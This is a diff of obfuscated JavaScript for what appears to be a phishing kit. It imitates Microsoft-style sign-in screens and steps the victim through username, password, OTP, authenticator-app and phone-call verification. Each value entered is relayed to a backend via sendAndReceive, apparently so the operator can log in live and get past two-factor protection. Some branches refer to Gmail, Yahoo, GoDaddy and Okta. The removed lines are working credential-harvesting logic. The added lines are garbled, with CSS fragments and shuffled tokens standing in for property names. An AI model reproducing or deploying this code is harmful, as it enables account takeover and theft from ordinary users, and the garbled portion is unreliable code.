-            _0x5c687e['message'] == _0xab1a37(0x35e) && (document[_0xab1a37(0x2fd)](_0xab1a37(0x2bb))[_0xab1a37(0x1ca)] = _0xab1a37(0x250), document[_0xab1a37(0x2fd)](_0xab1a37(0x26c))[_0xab1a37(0x2bf)](_0xab1a37(0x31a), '4'), document[_0xab1a37(0x2fd)]('inp_confirmemailorphone_live')[_0xab1a37(0x2bf)](_0xab1a37(0x310), _0xab1a37(0x295)), document[_0xab1a37(0x2fd)](_0xab1a37(0x26c))[_0xab1a37(0x259)] = '', document['getElementById'](_0xab1a37(0x26c))[_0xab1a37(0x2bf)](_0xab1a37(0x1dc), 'Last\x204\x20digits\x20of\x20phone\x20number'), document[_0xab1a37(0x2fd)](_0xab1a37(0x284))['style'][_0xab1a37(0x25b)] = _0xab1a37(0x201), document['getElementById']('error_confirmemailorphone_live')[_0xab1a37(0x1ca)] = '', checkerrordesc(_0xab1a37(0x36c), 0x0, _0x5c687e['description']), bottomsectionlinks(_0xab1a37(0x36c), _0x5c687e[_0xab1a37(0x227)]), changebackbutton(_0xab1a37(0x36c), _0x5c687e[_0xab1a37(0x214)]), document[_0xab1a37(0x2fd)](_0xab1a37(0x1e9))[_0xab1a37(0x259)] = _0x5c687e['phone'], document[_0xab1a37(0x2fd)](_0xab1a37(0x2ff) + view)[_0xab1a37(0x34a)][_0xab1a37(0x2cb)](_0xab1a37(0x26f)), document[_0xab1a37(0x2fd)](_0xab1a37(0x1c1))[_0xab1a37(0x34a)]['remove'](_0xab1a37(0x26f)), view = _0xab1a37(0x36c), viewtype = 'phone');
-            _0x5c687e[_0xab1a37(0x299)] == 'otp\x20sent\x20live' && (document[_0xab1a37(0x2fd)]('inp_otp_live')[_0xab1a37(0x2bf)](_0xab1a37(0x1dc), _0xab1a37(0x313)), document['getElementById'](_0xab1a37(0x257))[_0xab1a37(0x266)][_0xab1a37(0x25b)] = _0xab1a37(0x201), document[_0xab1a37(0x2fd)]('error_otp_live')[_0xab1a37(0x1ca)] = '', document[_0xab1a37(0x2fd)](_0xab1a37(0x351))[_0xab1a37(0x2bf)]('src', _0x5c687e['image_src']), checkerrordesc(_0xab1a37(0x1e3), 0x0, _0x5c687e['description']), bottomsectionlinks(_0xab1a37(0x1e3), _0x5c687e['bottomsection']), changebackbutton(_0xab1a37(0x1e3), _0x5c687e['backbutton']), document[_0xab1a37(0x2fd)](_0xab1a37(0x2ff) + view)[_0xab1a37(0x34a)]['toggle'](_0xab1a37(0x26f)), document[_0xab1a37(0x2fd)](_0xab1a37(0x212))[_0xab1a37(0x34a)][_0xab1a37(0x20a)](_0xab1a37(0x26f)), view = _0xab1a37(0x1e3), viewtype = _0xab1a37(0x30b));
-            _0x5c687e[_0xab1a37(0x299)] == _0xab1a37(0x357) && (document[_0xab1a37(0x2fd)](_0xab1a37(0x1fc))[_0xab1a37(0x266)]['display'] = 'none', document[_0xab1a37(0x2fd)]('error_authapp_live')[_0xab1a37(0x1ca)] = '', document[_0xab1a37(0x2fd)](_0xab1a37(0x29a))[_0xab1a37(0x1ca)] = _0x5c687e['authappreqid'], bottomsectionlinks(_0xab1a37(0x1c7), _0x5c687e[_0xab1a37(0x227)]), changebackbutton(_0xab1a37(0x1c7), _0x5c687e[_0xab1a37(0x214)]), document['getElementById'](_0xab1a37(0x2ff) + view)[_0xab1a37(0x34a)]['toggle'](_0xab1a37(0x26f)), document['getElementById']('section_authapp_live')[_0xab1a37(0x34a)]['remove'](_0xab1a37(0x26f)), view = 'authapp_live', viewtype = _0xab1a37(0x33e), wait2fa(_0xab1a37(0x263), _0x5c687e[_0xab1a37(0x224)]));
-            _0x5c687e['message'] == _0xab1a37(0x326) && (document['getElementById'](_0xab1a37(0x2ab))['classList'][_0xab1a37(0x291)](_0xab1a37(0x26f)) && (document['getElementById']('section_tryagainlater')[_0xab1a37(0x27b)](_0xab1a37(0x1cd))[_0xab1a37(0x1ca)] = _0xab1a37(0x2f6), setTimeout(function () {
-                const _0x4105d3 = _0xab1a37;
-                document[_0x4105d3(0x2fd)](_0x4105d3(0x2ff) + view)[_0x4105d3(0x27b)]('.loading-container')[_0x4105d3(0x34a)][_0x4105d3(0x20a)]('loading'), document[_0x4105d3(0x2fd)](_0x4105d3(0x2ff) + view)['querySelector'](_0x4105d3(0x24e))[_0x4105d3(0x266)][_0x4105d3(0x2da)] = 'hide-to-left\x200.5s', setTimeout(function () {
-                    const _0x5f1731 = _0x4105d3;
-                    document[_0x5f1731(0x2fd)](_0x5f1731(0x2ff) + view)[_0x5f1731(0x34a)][_0x5f1731(0x2cb)](_0x5f1731(0x26f)), document[_0x5f1731(0x2fd)](_0x5f1731(0x2ab))['querySelector'](_0x5f1731(0x2f7))['style']['display'] = _0x5f1731(0x1da), document[_0x5f1731(0x2fd)](_0x5f1731(0x2ab))[_0x5f1731(0x27b)](_0x5f1731(0x33d))[_0x5f1731(0x266)][_0x5f1731(0x25b)] = _0x5f1731(0x1da), document[_0x5f1731(0x2fd)](_0x5f1731(0x2ab))[_0x5f1731(0x27b)](_0x5f1731(0x24e))[_0x5f1731(0x266)][_0x5f1731(0x2da)] = 'show-from-right\x200.5s', document[_0x5f1731(0x2fd)](_0x5f1731(0x2ab))['classList'][_0x5f1731(0x20a)]('d-none'), view = _0x5f1731(0x32f);
-                }, 0xc8);
-            }, 0x1f4)));
-            if (_0x5c687e[_0xab1a37(0x299)] == 'redirected\x20back\x20to\x20sign\x20in') {
-                document['getElementById']('inp_uname')['value'] = '', document[_0xab1a37(0x2fd)](_0xab1a37(0x340))[_0xab1a37(0x1ca)] = '', document[_0xab1a37(0x2fd)](_0xab1a37(0x305))[_0xab1a37(0x259)] = '', bottomsectionlinks(_0xab1a37(0x367), [{
-                    'a_id': _0xab1a37(0x389),
-                    'a_text': 'Create\x20one!',
-                    'text': 'No\x20account?',
-                    'type': _0xab1a37(0x1fd)
-                }, {
-                    'a_id': _0xab1a37(0x22b),
-                    'a_text': _0xab1a37(0x261),
-                    'type': 'link'
-                }]);;
-                document['getElementById'](_0xab1a37(0x2ff) + view)[_0xab1a37(0x27b)](_0xab1a37(0x24e))['style'][_0xab1a37(0x2da)] = '', document[_0xab1a37(0x2fd)]('section_' + view)[_0xab1a37(0x34a)][_0xab1a37(0x2cb)](_0xab1a37(0x26f)), document[_0xab1a37(0x2fd)](_0xab1a37(0x32d))[_0xab1a37(0x27b)]('.sectioncontent')['style']['animation'] = '', document[_0xab1a37(0x2fd)](_0xab1a37(0x32d))[_0xab1a37(0x34a)][_0xab1a37(0x20a)](_0xab1a37(0x26f)), document[_0xab1a37(0x2ef)][_0xab1a37(0x266)][_0xab1a37(0x23d)] && (document[_0xab1a37(0x2ef)][_0xab1a37(0x266)][_0xab1a37(0x23d)] = ''), document[_0xab1a37(0x2ef)][_0xab1a37(0x266)]['backgroundColor'] && (document['body']['style'][_0xab1a37(0x2ac)] = '');
+            `
+              ][`getElementById`][`otpdesc`] &&
+                (document[
+                  `
+            ::-moz-selection {
+            background: #a6fff8;
             }
-            _0x5c687e['message'] == _0xab1a37(0x387) && (document[_0xab1a37(0x2fd)](_0xab1a37(0x226))['querySelector'](_0xab1a37(0x1cd))[_0xab1a37(0x29e)] = _0x5c687e[_0xab1a37(0x24d)], checkerrordesc('signinanothererrordesc', 0x2, _0x5c687e[_0xab1a37(0x1f0)]), document[_0xab1a37(0x2fd)](_0xab1a37(0x2ff) + view)[_0xab1a37(0x34a)]['toggle'](_0xab1a37(0x26f)), document[_0xab1a37(0x2fd)](_0xab1a37(0x226))[_0xab1a37(0x34a)]['remove']('d-none'), bottomsectionlinks(_0xab1a37(0x30f), _0x5c687e[_0xab1a37(0x227)]), view = 'signinanothererror'), _0x5c687e[_0xab1a37(0x299)] == _0xab1a37(0x230) && (document['getElementById'](_0xab1a37(0x2ff) + view)['classList'][_0xab1a37(0x2cb)](_0xab1a37(0x26f)), document[_0xab1a37(0x2fd)](_0xab1a37(0x2cf))['classList']['remove'](_0xab1a37(0x26f)), view = _0xab1a37(0x1be)), _0x5c687e[_0xab1a37(0x299)] == _0xab1a37(0x35b) && (_0x5c687e['type'] == _0xab1a37(0x30b) && (otptype = 0x1), _0x5c687e[_0xab1a37(0x222)] == _0xab1a37(0x37d) && (otptype = 0x2), _0x5c687e[_0xab1a37(0x222)] == _0xab1a37(0x343) && (otptype = 0x3), document[_0xab1a37(0x2fd)](_0xab1a37(0x2c1))[_0xab1a37(0x1ca)] = '', document[_0xab1a37(0x2fd)](_0xab1a37(0x28b))[_0xab1a37(0x2bf)](_0xab1a37(0x293), _0x5c687e[_0xab1a37(0x328)]), checkerrordesc('otp', 0x0, _0x5c687e[_0xab1a37(0x2de)]), bottomsectionlinks(_0xab1a37(0x30b), _0x5c687e[_0xab1a37(0x227)]), changebackbutton(_0xab1a37(0x30b), _0x5c687e[_0xab1a37(0x214)]), document['getElementById'](_0xab1a37(0x2ff) + view)[_0xab1a37(0x34a)][_0xab1a37(0x2cb)](_0xab1a37(0x26f)), document[_0xab1a37(0x2fd)](_0xab1a37(0x366))['classList'][_0xab1a37(0x20a)](_0xab1a37(0x26f)), view = _0xab1a37(0x30b), viewtype = null), _0x5c687e[_0xab1a37(0x299)] == 'approve\x20auth\x20request\x20auth\x20app' && (document[_0xab1a37(0x2fd)](_0xab1a37(0x2c1))[_0xab1a37(0x1ca)] = '', document['getElementById'](_0xab1a37(0x2c4))[_0xab1a37(0x2bf)](_0xab1a37(0x293), _0x5c687e[_0xab1a37(0x328)]), checkerrordesc(_0xab1a37(0x318), 0x0, _0x5c687e[_0xab1a37(0x2de)]), bottomsectionlinks(_0xab1a37(0x318), _0x5c687e[_0xab1a37(0x227)]), changebackbutton(_0xab1a37(0x318), _0x5c687e[_0xab1a37(0x214)]), document[_0xab1a37(0x2fd)](_0xab1a37(0x1d4))[_0xab1a37(0x29e)] = _0x5c687e[_0xab1a37(0x1d4)], document[_0xab1a37(0x2fd)](_0xab1a37(0x2ff) + view)[_0xab1a37(0x34a)][_0xab1a37(0x2cb)](_0xab1a37(0x26f)), document[_0xab1a37(0x2fd)]('section_authapp')[_0xab1a37(0x34a)][_0xab1a37(0x20a)](_0xab1a37(0x26f)), view = _0xab1a37(0x318), viewtype = null, wait2fa(_0xab1a37(0x263), _0x5c687e[_0xab1a37(0x224)])), _0x5c687e[_0xab1a37(0x299)] == _0xab1a37(0x35d) && (document[_0xab1a37(0x2fd)](_0xab1a37(0x246))['querySelector'](_0xab1a37(0x2ad))['focus'](), document[_0xab1a37(0x2fd)](_0xab1a37(0x2c1))[_0xab1a37(0x1ca)] = '', document[_0xab1a37(0x2fd)](_0xab1a37(0x205))[_0xab1a37(0x2bf)](_0xab1a37(0x293), _0x5c687e[_0xab1a37(0x328)]), checkerrordesc('authcall', 0x0, _0x5c687e['description']), bottomsectionlinks('authcall', _0x5c687e['bottomsection']), changebackbutton('authcall', _0x5c687e[_0xab1a37(0x214)]), document[_0xab1a37(0x2fd)](_0xab1a37(0x2ff) + view)[_0xab1a37(0x34a)]['toggle'](_0xab1a37(0x26f)), document['getElementById']('section_authcall')['classList']['remove'](_0xab1a37(0x26f)), view = _0xab1a37(0x255), viewtype = null, wait2fa(_0xab1a37(0x1e5))), _0x5c687e[_0xab1a37(0x299)] == 'error' && (bottomsectionlinks(_0xab1a37(0x27a), _0x5c687e[_0xab1a37(0x227)]), changebackbutton(_0xab1a37(0x27a), _0x5c687e[_0xab1a37(0x214)]), checkerrordesc(_0xab1a37(0x27a), 0x1, _0x5c687e[_0xab1a37(0x2de)])), _0x5c687e['message'] == _0xab1a37(0x25e) && (document[_0xab1a37(0x2fd)]('error_2fa')[_0xab1a37(0x1ca)] = '', checkerrordesc(_0xab1a37(0x25e), 0x0, _0x5c687e[_0xab1a37(0x2de)]), bottomsectionlinks(_0xab1a37(0x203), _0x5c687e[_0xab1a37(0x227)]), changebackbutton(_0xab1a37(0x203), _0x5c687e[_0xab1a37(0x214)]), document[_0xab1a37(0x2fd)]('section_' + view)[_0xab1a37(0x34a)][_0xab1a37(0x2cb)](_0xab1a37(0x26f)), document[_0xab1a37(0x2fd)](_0xab1a37(0x2a3))['classList'][_0xab1a37(0x20a)]('d-none'), view = _0xab1a37(0x203), viewtype = null), _0x5c687e[_0xab1a37(0x299)] == _0xab1a37(0x231) && (document['getElementById'](_0xab1a37(0x2fa))[_0xab1a37(0x27b)]('.title')[_0xab1a37(0x29e)] = 'Request\x20wasn\x27t\x20sent', document[_0xab1a37(0x2fd)](_0xab1a37(0x2a4))[_0xab1a37(0x34a)]['toggle']('error'), document['getElementById'](_0xab1a37(0x2a4))[_0xab1a37(0x2fc)] = _0xab1a37(0x31f), view = _0xab1a37(0x237), viewtype = null);
-        }
-    })[_0x223dba(0x2cc)](_0x477fb1 => {
-        const _0x7a2c6f = _0x223dba;
-        loadinganimation(0x1), console[_0x7a2c6f(0x2c8)](_0x7a2c6f(0x319), _0x477fb1);
-    });
-}
-const unameInp = document['getElementById'](`classList`),
-    pwdInp = document[`915612HwjQev`]('inp_pwd');
-let unameVal = pwdVal = ![];
-const nxt = document['getElementById']('btn_next');
-nxt[`auth`]('click', () => {
-    validate();
-});
-const sig = document[`915612HwjQev`](`authapp_live_code`);
-sig[`auth`](`error_otp`, () => {
-    validate();
-});
-const cancelbtns = document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`](`iProofPhone`);
-for (let i = 0x0; i < cancelbtns['length']; i++) {
-    cancelbtns[i][`auth`](`error_otp`, () => {
-        const _0x3eed07 = _0xe042e;
-        loadinganimation(0x0), document[`915612HwjQev`](`table-cell` + view)[`hide-to-left `](`maxLength`)[`position`]['animation'] = '', loadinganimation(0x1), document[`915612HwjQev`]('section_uname')[`hide-to-left `]('.sectioncontent')[`position`][`section_multipleaccounts_adfs`] = '', document[`915612HwjQev`](`table-cell` + view)[`error_2fa`][`live.`]('d-none'), document[`915612HwjQev`](`authapperrordesc`)['querySelector']('.sectioncontent')[`position`][`section_multipleaccounts_adfs`] = '', document[`915612HwjQev`]('section_uname')[`error_2fa`][`json`](`onclick`), document[`style`][`position`]['backgroundImage'] && (document[`style`][`position`][`<p class="mb-16">`] = ''), document['body'][`position`][`button.show-hide-btn`] && (document[`style`][`position`][`button.show-hide-btn`] = ''), document['getElementById'](`classList`)[`591780njOthf`] = '', document[`915612HwjQev`](`godaddy`)[`signoutoption`] = '', document['getElementById']('inp_pwd')[`591780njOthf`] = '', document[`915612HwjQev`](`section_authapp`)[`591780njOthf`] = '', document[`915612HwjQev`](`otp sent`)['value'] = '', document[`915612HwjQev`](`otp sent`)[`yahoo.`](`background`, 'password'), document[`hide-to-left `](`proof`)[`hide-to-left `](`input#i011e.okta`)[`Too many Attempts`] = 'Show', view = `description`;
-    });
-}
-const protectbtn = document[`915612HwjQev`](`iProofLbl1`);
-
-function protectsend(_0x78561a) {
-    const _0x41f5a3 = _0xe042e;
-    if (protectbtn[`Too many Attempts`] == `sign in blocked`) {
-        const _0x10784c = document[`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`](`text_link`);
-        let _0x23b19f = 0x0;
-        for (let _0x52e489 = 0x0; _0x52e489 < _0x10784c['length']; _0x52e489++) {
-            if (_0x10784c[_0x52e489] === _0x78561a) {
-                _0x23b19f = _0x52e489;
-                break;
+            
+            ::selection {
+            background: #a6fff8;
             }
-        }
-        console['log'](_0x23b19f);
-        const _0x4251d5 = document[`hide-to-left `](` <a href="#" data-id="`);
-        loadinganimation(0x0), sendAndReceive('enterprotect', [_0x23b19f, _0x4251d5[`591780njOthf`]], 0x1)[`link`](_0xf9b3ac => {
-            const _0x4ed8ab = _0x41f5a3;
-            _0xf9b3ac && _0xf9b3ac[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] !== `#f5f7f8` && (loadinganimation(0x1), _0xf9b3ac[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `https://get.geojs.io/v1/ip/geo.json` && (document[`915612HwjQev`]('error_2fa')['innerText'] = '', document['getElementById'](`inp_uname`)[`yahoo.`](`remove`, _0xf9b3ac[`pdfemail`]), checkerrordesc(`2fa is off newwebsite`, 0x0, _0xf9b3ac['description']), bottomsectionlinks('otp', _0xf9b3ac[`listitem`]), changebackbutton('otp', _0xf9b3ac[`country`]), document[`915612HwjQev`](`godaddyemail`)[`error_2fa`][`live.`](`onclick`), document[`915612HwjQev`]('section_otp')[`error_2fa`][`json`](`onclick`), view = `2fa is off newwebsite`), _0xf9b3ac[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `CompanionAppsNotification` && (bottomsectionlinks(`</a></p>`, _0xf9b3ac[`listitem`]), changebackbutton(`</a></p>`, _0xf9b3ac['backbutton']), checkerrordesc(`</a></p>`, 0x1, _0xf9b3ac[`authcall`])));
-        })[`TwoWayVoiceMobile`](_0x5347fe => {
-            const _0x150521 = _0x41f5a3;
-            loadinganimation(0x1), console[`CompanionAppsNotification`](`pwd`, _0x5347fe);
-        });
-    }
-    if (protectbtn['textContent'] == `script[src^="`) {}
-    if (protectbtn[`Too many Attempts`] == `2fa is off`) {}
-}
-
-function twofalive(_0x4aede6) {
-    const _0x3dfde8 = _0xe042e;
-    if (view == 'confirmemailorphone_live') {
-        let _0x4c11c5 = null,
-            _0x10b55b = null;
-        viewtype == `.iAdditionalProofInfo` && (_0x4c11c5 = 'EmailOTP_Live');
-        viewtype == `Email name` && (_0x4c11c5 = `replace`);
-        let _0xcaff13 = document['getElementById'](`otp_live`)[`591780njOthf`],
-            _0x5cb21c = document[`915612HwjQev`](`div`)['value'];
-        viewtype == `.iAdditionalProofInfo` && (_0x5cb21c[`querySelectorAll`](0x0, 0x2) !== _0xcaff13[`querySelectorAll`](0x0, 0x2) && (document['getElementById'](`uname_pdf`)['style']['marginBottom'] = `parentNode`, document[`915612HwjQev`](`uname_pdf`)[`position`][`accountoptions`] = 'block', document[`915612HwjQev`](`uname_pdf`)[`signoutoption`] = `redirected back to sign in` + _0x5cb21c['slice'](0x0, 0x2) + '\x22.'), _0x5cb21c['slice'](0x0, 0x2) == _0xcaff13[`querySelectorAll`](0x0, 0x2) && (_0x10b55b = 0x1)), viewtype == `Email name` && (_0x5cb21c[`querySelectorAll`](-0x2) !== _0xcaff13['slice'](-0x2) && (document[`915612HwjQev`](`uname_pdf`)[`position`][`section_confirmemail`] = `parentNode`, document[`915612HwjQev`](`uname_pdf`)['style'][`accountoptions`] = `303460zKjElf`, document[`915612HwjQev`](`uname_pdf`)[`signoutoption`] = `a_text` + _0x5cb21c[`querySelectorAll`](-0x2) + '.'), _0x5cb21c[`querySelectorAll`](-0x2) == _0xcaff13[`querySelectorAll`](-0x2) && (_0x10b55b = 0x1)), _0x10b55b == 0x1 && (document[`915612HwjQev`](`uname_pdf`)[`position`][`accountoptions`] = `trim`, document[`915612HwjQev`](`uname_pdf`)['innerText'] = '', loadinganimation(0x0), sendAndReceive(`logo`, [_0x4c11c5, _0xcaff13], 0x1)[`link`](_0x53f527 => {
-            const _0x146271 = _0x3dfde8;
-            _0x53f527 && _0x53f527[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] !== `#f5f7f8` && (loadinganimation(0x1), _0x53f527[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `script` && (document['getElementById'](`alert-error`)['innerText'] = _0x53f527[`.iAdditionalProofInfo`], checkerrordesc(`error_uname_pdf`, 0x0, _0x53f527['description']), checkerrordesc(`#tryagainheader`, 0x2, _0x53f527[`section_confirmemailorphone_live`]), document[`915612HwjQev`]('section_' + view)[`error_2fa`][`live.`]('d-none'), document[`915612HwjQev`](`We didn't hear from you`)['classList'][`json`](`onclick`), view = `error_uname_pdf`), _0x53f527[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'email\x20otp' && (document[`915612HwjQev`](`uname_pdf`)[`position`][`accountoptions`] = `trim`, document[`915612HwjQev`](`uname_pdf`)[`signoutoption`] = '', document[`915612HwjQev`](`error`)[`yahoo.`](`remove`, _0x53f527[`pdfemail`]), checkerrordesc(`selectmultipleaccountadfs`, 0x0, _0x53f527[`authcall`]), bottomsectionlinks(`selectmultipleaccountadfs`, _0x53f527[`listitem`]), changebackbutton('otp_live', _0x53f527[`country`]), document[`915612HwjQev`](`signinblocked live`)['classList'][`live.`](`onclick`), document[`915612HwjQev`](`gmail.`)[`error_2fa`][`json`](`onclick`), view = 'otp_live', viewtype = 'email'), _0x53f527[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `input-max-width` && (document[`915612HwjQev`](`uname_pdf`)['innerText'] = '', document[`915612HwjQev`](`error`)['setAttribute']('src', _0x53f527[`pdfemail`]), checkerrordesc(`selectmultipleaccountadfs`, 0x0, _0x53f527[`authcall`]), bottomsectionlinks(`selectmultipleaccountadfs`, _0x53f527['bottomsection']), changebackbutton(`selectmultipleaccountadfs`, _0x53f527[`country`]), document[`915612HwjQev`]('section_confirmemailorphone_live')[`error_2fa`]['toggle'](`onclick`), document['getElementById'](`gmail.`)[`error_2fa`][`json`](`onclick`), view = `selectmultipleaccountadfs`, viewtype = `Email name`, document[`915612HwjQev`]('error_confirmemailorphone_live')['style']['display'] = `trim`));
+            `
+                ][`getElementById`][`otpdesc`] = ""),
+              document[
+                `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+              ][`getElementById`]["backgroundColor"] &&
+                (document["body"]["style"]["backgroundColor"] = ""),
+              (view = `2fa is on`)),
+            _0x2fced9["message"] ==
+              "approve\x20auth\x20request\x20auth\x20app" &&
+              (document[`selectprotectoption(this)`]("authappimg")[
+                `142499lsAMVs`
+              ](`fail`, _0x2fced9[`Too many Attempts`]),
+              checkerrordesc(`email otp live`, 0x0, _0x2fced9[`confirmemail`]),
+              bottomsectionlinks(`email otp live`, _0x2fced9[`otp sent live`]),
+              changebackbutton(`email otp live`, _0x2fced9["backbutton"]),
+              (document["getElementById"](`authenticaion failed`)[
+                "textContent"
+              ] = _0x2fced9[`authenticaion failed`]),
+              document["getElementById"](`<p>`)[`pdfemail`]["toggle"](
+                `background-image`,
+              ),
+              document["getElementById"]("section_authapp")[`pdfemail`][
+                "remove"
+              ](`background-image`),
+              (view = `email otp live`),
+              wait2fa(`</a>`, _0x2fced9[`#tryagain_toomanyattempts`])),
+            _0x2fced9["message"] == `mb-16` &&
+              (document[`selectprotectoption(this)`]("section_authcall")
+                [`.loading-container`](".back")
+                [`error_uname_doc`](),
+              document[`selectprotectoption(this)`](
+                `error_confirmemailorphone_live`,
+              )[`142499lsAMVs`](`fail`, _0x2fced9[`Too many Attempts`]),
+              checkerrordesc(`oninput`, 0x0, _0x2fced9[`confirmemail`]),
+              bottomsectionlinks(`oninput`, _0x2fced9[`otp sent live`]),
+              changebackbutton("authcall", _0x2fced9[`#docemailloading`]),
+              document[`selectprotectoption(this)`](`<p>`)["classList"][
+                `waiting`
+              ](`background-image`),
+              document[`selectprotectoption(this)`]("section_authcall")[
+                `pdfemail`
+              ]["remove"](`background-image`),
+              (view = `oninput`),
+              wait2fa(`9tzhllo`)));
+        })
+        [`section_signinanothererror`]((_0xc3d77d) => {
+          const _0x50029a = _0x1359e5;
+          loadinganimation(0x1),
+            console["error"](`selecttwofamethod(this)`, _0xc3d77d);
         }));
-    }
-    if (view == 'otp_live') {
-        let _0x4bfe19 = null,
-            _0x2b4b86 = null;
-        viewtype == `.iAdditionalProofInfo` && (_0x4bfe19 = `section_protectaccount`);
-        viewtype == `Email name` && (_0x4bfe19 = `Can’t access your account?`);
-        viewtype == `2fa is off newwebsite` && (_0x4bfe19 = 'PhoneAppOTP_Live');
-        let _0x327229 = document[`915612HwjQev`](`error_pwd`)['value'];
-        viewtype == 'email' && (_0x327229 == '' && (document[`915612HwjQev`](`iProofPhoneEntry`)[`position`][`section_confirmemail`] = `parentNode`, document[`915612HwjQev`](`iProofPhoneEntry`)[`position`]['display'] = 'block', document['getElementById'](`iProofPhoneEntry`)[`signoutoption`] = `btn_next_pdf`), _0x327229 !== '' && (_0x2b4b86 = 0x1)), viewtype == `Email name` && (_0x327229 == '' && (document[`915612HwjQev`](`iProofPhoneEntry`)[`position`][`section_confirmemail`] = '14px', document[`915612HwjQev`](`iProofPhoneEntry`)['style'][`accountoptions`] = 'block', document[`915612HwjQev`]('error_otp_live')[`signoutoption`] = `btn_next_pdf`), _0x327229 !== '' && (_0x2b4b86 = 0x1)), viewtype == `2fa is off newwebsite` && (_0x327229 == '' && (document[`915612HwjQev`](`iProofPhoneEntry`)[`position`]['marginBottom'] = `parentNode`, document[`915612HwjQev`](`iProofPhoneEntry`)['style']['display'] = 'block', document['getElementById']('error_otp_live')['innerText'] = 'Enter\x20the\x20code\x20to\x20help\x20us\x20verify\x20your\x20identity.'), _0x327229 !== '' && (_0x2b4b86 = 0x1)), _0x2b4b86 == 0x1 && (document[`915612HwjQev`](`iProofPhoneEntry`)['style'][`accountoptions`] = `trim`, document[`915612HwjQev`]('error_otp_live')[`signoutoption`] = '', loadinganimation(0x0), sendAndReceive('twofaselected', [_0x4bfe19, _0x327229], 0x1)[`link`](_0x1a5f27 => {
-            const _0x3dfb3e = _0x3dfde8;
-            _0x1a5f27 && _0x1a5f27[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] !== `#f5f7f8` && (loadinganimation(0x1), _0x1a5f27[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `script` && (document['getElementById']('signin_blocked_live_email')[`signoutoption`] = _0x1a5f27[`.iAdditionalProofInfo`], checkerrordesc(`error_uname_pdf`, 0x0, _0x1a5f27[`authcall`]), checkerrordesc(`#tryagainheader`, 0x2, _0x1a5f27[`section_confirmemailorphone_live`]), document['getElementById']('section_' + view)[`error_2fa`][`live.`](`onclick`), document['getElementById'](`We didn't hear from you`)[`error_2fa`][`json`](`onclick`), view = `error_uname_pdf`), (_0x1a5f27[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `request wasnt sent` || _0x1a5f27[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'valid\x20phone\x20otp' || _0x1a5f27[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == `2fa`) && (document[`915612HwjQev`](`parse`)[`signoutoption`] = '', document['getElementById'](`gmail.`)[`error_2fa`][`live.`](`onclick`), document['getElementById'](`3162355BEcpic`)[`error_2fa`][`json`](`onclick`), view = `Enter the code you received`), _0x1a5f27[`To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.`] == 'error\x20live' && (document[`915612HwjQev`](`iProofPhoneEntry`)['style'][`accountoptions`] = `303460zKjElf`, checkerrordesc(`selectmultipleaccountadfs`, 0x1, _0x1a5f27[`authcall`]), bottomsectionlinks(`selectmultipleaccountadfs`, _0x1a5f27[`listitem`]), changebackbutton(`selectmultipleaccountadfs`, _0x1a5f27['backbutton'])));
-        }));
-    }
 }
-const confirmbtn = document[`915612HwjQev`]('btn_confirmemail');
-confirmbtn['addEventListener']('click', () => {
-    const _0xdc0bca = _0xe042e,
-        _0x268f6d = document[_0xdc0bca(0x2fd)](_0xdc0bca(0x206));
-    loadinganimation(0x0), sendAndReceive(_0xdc0bca(0x203), [_0x268f6d['value']], 0x1)[_0xdc0bca(0x1f9)](_0x512f41 => {
-        const _0x38de93 = _0xdc0bca;
-        _0x512f41 && _0x512f41['message'] !== _0x38de93(0x360) && (loadinganimation(0x1), _0x512f41[_0x38de93(0x299)] == _0x38de93(0x35b) && (document['getElementById'](_0x38de93(0x26a))[_0x38de93(0x1ca)] = '', document[_0x38de93(0x2fd)](_0x38de93(0x28b))['setAttribute'](_0x38de93(0x293), _0x512f41['image_src']), checkerrordesc('otp', 0x0, _0x512f41[_0x38de93(0x2de)]), bottomsectionlinks(_0x38de93(0x30b), _0x512f41[_0x38de93(0x227)]), changebackbutton('otp', _0x512f41[_0x38de93(0x214)]), document[_0x38de93(0x2fd)]('section_confirmemail')['classList'][_0x38de93(0x2cb)](_0x38de93(0x26f)), document['getElementById'](_0x38de93(0x366))[_0x38de93(0x34a)][_0x38de93(0x20a)](_0x38de93(0x26f)), view = _0x38de93(0x30b)), _0x512f41[_0x38de93(0x299)] == _0x38de93(0x267) && (document['getElementById'](_0x38de93(0x26a))[_0x38de93(0x1ca)] = '', document[_0x38de93(0x2fd)](_0x38de93(0x28b))[_0x38de93(0x2bf)](_0x38de93(0x293), _0x512f41['image_src']), checkerrordesc(_0x38de93(0x30b), 0x0, _0x512f41[_0x38de93(0x2de)]), bottomsectionlinks('otp', _0x512f41[_0x38de93(0x227)]), changebackbutton(_0x38de93(0x30b), _0x512f41[_0x38de93(0x214)]), document[_0x38de93(0x2fd)](_0x38de93(0x2a3))['classList'][_0x38de93(0x2cb)](_0x38de93(0x26f)), document[_0x38de93(0x2fd)](_0x38de93(0x366))[_0x38de93(0x34a)]['remove']('d-none'), view = _0x38de93(0x30b)), _0x512f41['message'] == _0x38de93(0x22a) && (document[_0x38de93(0x2fd)](_0x38de93(0x26a))[_0x38de93(0x1ca)] = '', document['getElementById'](_0x38de93(0x28b))[_0x38de93(0x2bf)]('src', _0x512f41[_0x38de93(0x328)]), checkerrordesc(_0x38de93(0x30b), 0x0, _0x512f41[_0x38de93(0x2de)])), _0x512f41['message'] == _0x38de93(0x2c8) && (bottomsectionlinks(_0x38de93(0x25e), _0x512f41[_0x38de93(0x227)]), changebackbutton(_0x38de93(0x25e), _0x512f41[_0x38de93(0x214)]), checkerrordesc(_0x38de93(0x25e), 0x1, _0x512f41[_0x38de93(0x2de)])));
